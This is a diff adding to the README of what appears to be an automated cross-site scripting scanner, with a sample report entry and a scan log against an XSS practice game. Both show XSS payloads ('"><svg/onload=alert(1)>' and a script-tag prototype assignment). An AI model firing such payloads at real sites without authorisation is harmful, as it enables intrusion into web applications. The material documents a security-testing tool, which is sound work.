@@ -137,8 +137,25 @@ Flag	Purpose
 --autotest	Run built‑in self‑test suite and exit
 Report Format
 Findings are appended to reports/YYYY‑MM‑DD‑HHMM.md:
-
 [+] http://example.com/product?id=1337
     parameter : id
     payload   : "><svg/onload=alert(1)>
+```
+
+## Real Outputs and in CTF with full automation
+```
+├─▶ http://xss-game.appspot.com
+│   WAF detected: unknown
+[static] crawling http://xss-game.appspot.com (≤100 pages, depth=0)
+[static] discovered 1 endpoints
+[dynamic] launching Playwright for http://xss-game.appspot.com
+[dynamic] discovered 5 endpoints
+│   HTTP targets: 6   WS targets: 0
+- **XSS** GET `http://xss-game.appspot.com/level1/frame` payload=`<!--><script>__proto__.x=amounts</script><!-->`
+│   ✓ fuzzing complete
+```
+
+## Generates never seen before payload on the spot 
+```
+<!--><script>__proto__.x=amounts</script><!-->
 ```
